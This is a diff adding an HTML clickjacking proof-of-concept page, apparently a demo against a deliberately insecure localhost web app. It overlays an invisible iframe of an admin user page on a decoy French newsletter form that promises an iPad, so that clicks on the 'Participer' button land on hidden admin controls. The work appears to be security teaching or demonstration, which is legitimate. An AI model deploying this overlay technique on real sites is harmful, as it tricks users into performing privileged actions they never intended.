@@ -1,0 +1,157 @@
+<html>
+<head>
+    <title>Clickjack test page</title>
+        <!-- base href="/" -->
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="SHORTCUT ICON" href="app/assets/images/favicon.ico"/>
+
+        <!-- <link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.min.css" -->
+        <link rel="stylesheet" href="app/assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="app/assets/css/font-awesome.min.css">
+
+        <!-- Custom styles for this template -->
+        <link rel="stylesheet" href="app/assets/css/sticky-footer-navbar.css" >
+        <link rel="stylesheet" href="app/assets/css/main.css" >
+        <link rel="stylesheet" href="app/assets/css/login-modal.css" >
+        <!--[if lt IE 9]>
+        <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+
+    <style>
+        div.eframe {
+        position:absolute;
+        top:0px;
+        left:0px;
+        right:0px;
+        bottom:0px;
+            opacity: 0;
+            border: 0px;
+            /*visibility: hidden;*/
+            z-index: 2;
+
+        }
+        #iframe {
+            height:100%;
+            width:100%;
+        }
+        #attacker {
+            position: absolute;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+<!--<p>Website is vulnerable to clickjacking!</p>-->
+<div class="eframe">
+    <iframe id="iframe" src="https://localhost:9090/#/users/admin/3" ></iframe>
+</div>
+
+<!--<div id="attacker" >-->
+<nav class="navbar navbar-default navbar-static-top">
+
+    <div class="container">
+        <ul class="nav navbar-nav navbar-right" data-deferred-cloak>
+        </ul>
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target="#navbar" aria-expanded="false"
+                    aria-controls="navbar">
+                <span class="sr-only">Toggle navigation</span> <span
+                    class="icon-bar"></span> <span class="icon-bar"></span> <span
+                    class="icon-bar"></span>
+            </button>
+            <div class="navbar-brand"><a href="/">
+                <span><img src="app/assets/images/1075135.png"></span></a>
+                Unsecured Web App</div>
+        </div>
+        <div id="navbar" class="collapse navbar-collapse">
+            <ul class="nav navbar-nav navbar-right">
+                <li class="dropdown" >
+                    <a href="#/todos" id="menu_todos">Hi</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+<div class="container">
+    <div class="row">
+        <div class="col-md-12">
+            <!-- ngRepeat: alert in alerts -->
+        </div>
+    </div>
+
+</div>
+<div class="container">
+</div>
+<div class="container">
+    <div class="row">
+
+        <legend>Inscrivez-vous à notre newsletter</legend>
+        <form name="userForm" class="form-horizontal" novalidate>
+
+            <div class="form-group" ng-class="{'has-error' : userForm.name.$invalid}">
+                <label for="user" class="col-sm-2">Nom/Prénom</label>
+                <div class="col-sm-10">
+                    <input type="text" class="form-control" name="name" id="user" placeholder="Nom" ng-model="user.name"
+                           required ng-maxlength="25" pattern="[a-zA-Z0-9\.-@]+"
+                           disabled value="paticipant hol ">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="col-sm-offset-2 col-sm-10">
+                    <div class="checkbox">
+                        <label>
+                            <input disable type="checkbox" ng-model="admin" ng-disabled="!profileWrite" value=true checked > Participez  pour gagner un iPad ! !
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group" ng-class="{'has-error' : userForm.password.$invalid}">
+                <label for="password" class="col-sm-2">Adresse e-mail de participation </label>
+                <div class="col-sm-10">
+                    <input disabled type="text" class="form-control" name="password" placeholder="Mot de passe" ng-model="user.key"
+                           ng-minlength="4" value="participant@devoxx.fr">
+                </div>
+            </div>
+
+            <div class="form-group" ng-class="{'has-error' : userForm.confirmation.$invalid}">
+                <label for="confirmation" class="col-sm-2">Adresse</label>
+                <div class="col-sm-10">
+                    <input disabled type="text" class="form-control"  name="confirmation" placeholder="Confirmation du mot de passe" ng-model="confirmation"
+                            value="Palais des congrès" >
+                </div>
+            </div>
+
+            <footer class="form-actions pull-right">
+                <a href="#/users" class="btn btn-default ">Annuler</a>
+                <a class="btn btn-primary "
+                   ng-disabled="userForm.$invalid || ($scope.user.key != $scope.confirmation)"
+                   ng-click="userForm.$invalid ? null : saveUser()">Participer</a>
+            </footer>
+
+        </form>
+
+
+    </div>
+</div>
+
+</div>
+
+<script>
+    function fun() {
+        // var targetIframe = document.getElementById("iframe").contentDocument;
+        // targetIframe.getElementById("todo-title").innerText = "Hi";
+    }
+
+    setTimeout("fun()", 3000);
+</script>
+
+
+
+
+</body>
+</html>
